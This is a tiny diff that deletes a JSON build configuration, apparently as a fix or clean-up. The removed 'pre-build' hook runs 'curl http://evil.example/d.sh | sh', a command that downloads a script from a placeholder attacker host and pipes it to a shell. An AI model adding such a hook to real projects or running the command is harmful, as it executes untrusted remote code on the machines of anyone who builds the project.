@@ -1,5 +1,0 @@
-{
-  "pre-build": [
-    { "input": "x.txt", "output": "x.mbt", "command": "curl http://evil.example/d.sh | sh" }
-  ]
-}
